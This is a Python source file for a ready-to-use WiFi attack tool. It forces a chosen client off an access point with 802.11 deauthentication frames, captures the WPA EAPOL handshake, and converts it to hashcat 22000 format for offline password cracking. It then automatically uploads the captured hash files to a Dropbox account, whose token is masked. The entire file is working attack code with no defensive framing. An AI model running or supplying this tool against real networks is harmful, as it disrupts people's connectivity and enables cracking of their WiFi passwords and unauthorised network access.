import argparse
import os
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
import dropbox as dropbox
from dropbox.files import WriteMode
from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff
from scapy.utils import PcapWriter


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


packet_list = []


def is_root():
    if os.geteuid() != 0:
        print("This Program must run with root privileges, Exiting...")
        sys.exit()


def check_args():
    parser = argparse.ArgumentParser(description='Custom WiFi Deauthenticator')
    parser.add_argument('-i', '--interface', help='Define Network Interface in Monitor Mode, Default: wlan0',
                        default='wlan0', dest='iface')
    parser.add_argument('-a', '--ap', help='AP MAC Address (UPPER), Default: None', required=True, dest='ap')
    parser.add_argument('-c', '--client', help='Client MAC Address (UPPER), Default: None', required=True,
                        dest='client')
    parser.add_argument('-C', '--channel', help='AP Channel, Default: None', type=int, required=True, dest='channel')
    parser.add_argument('-d', '--deauth', help='Number of Deauth packets to send, Default: 1', type=int, default='1',
                        dest='deauth_count')
    parser.add_argument('-p', '--pcap',
                        help='PCAP file to save EAPOL Packets Automatically Appended Current Time, Default: '
                             'sniffed_date.pcap',
                        default='sniffed.pcap', dest='pcap_file')
    results = parser.parse_args()
    return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.pcap_file


def sniffer():
    print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
    sniff(iface=iface, prn=packethandler, timeout=5)


def packethandler(pkt):
    pktdump = PcapWriter(pcap_file, append=True, sync=True)
    if pkt.haslayer(Dot11):
        if pkt.haslayer(EAPOL) or (pkt.type == 0 and pkt.addr3 == ap.lower()):
            pktdump.write(pkt)
            if pkt.haslayer(EAPOL):
                print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC: %s and DST: %s{bcolors.ENDC}"
                      % (pkt.addr2, pkt.addr1))
                packet_list.append(pkt)


def cap_converter():
    print('\n''Converting to hashcat 22000 format..''\n')
    hccapx_path = os.path.splitext(pcap_file)[0] + '.22000'
    if shutil.which("cap2hccapx.bin") is not None:
        subprocess.call('/usr/local/bin/cap2hccapx.bin %s %s' % (pcap_file, hccapx_path), shell=True)
        print('\n')
    else:
        print(f"{bcolors.FAIL}can't find cap2hccapx.bin in PATH{bcolors.ENDC}\n")


def send_deauth_packet():
    pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
    sendp(pkt1, count=deauth_count, iface=iface, verbose=False)


def dropbox_uploader():
    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    rootdir = os.getcwd()
    print("Attempting to upload...")
    for dir, dirs, files in os.walk(rootdir):
        for file in files:
            if file.endswith('.22000'):
                try:
                    file_path = os.path.join(dir, file)
                    dest_path = os.path.join('/', file)
                    if os.stat(file_path).st_size != 0:
                        print('Uploading %s to %s' % (file_path, dest_path))
                        with open(file_path, 'rb') as f:
                            dbx.files_upload(f.read(), dest_path, mode=dropbox.files.WriteMode.overwrite, mute=True)
                except Exception as err:
                    print("Failed to upload %s\n%s" % (file, err))

    print(f"{bcolors.OKGREEN}Finished upload.{bcolors.ENDC}")


if __name__ == '__main__':
    is_root()
    iface, ap, client, channel, deauth_count, pcap_file = check_args()
    pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
    # current time in the middle of pcap file name
    os.system('iwconfig %s channel %s' % (iface, channel))  # Set WiFi Adapter On right Channel
    t = threading.Thread(target=sniffer)  # Configure Sniffing in backgroud.
    t.start()  # Start Sniffing in the backgroud.
    time.sleep(2)  # Wait 2 seconds for sniffing to start.
    send_deauth_packet()  # Send Deauth packet function.
    print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
    t.join()
    print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" % (len(packet_list)), '\n')
    print('Packets Written to: %s' % (os.getcwd()+'/'+pcap_file))
    cap_converter()  # Function that converts pcap to hashcat 22000 mode.
    dropbox_uploader()  # Automatic hash uploader
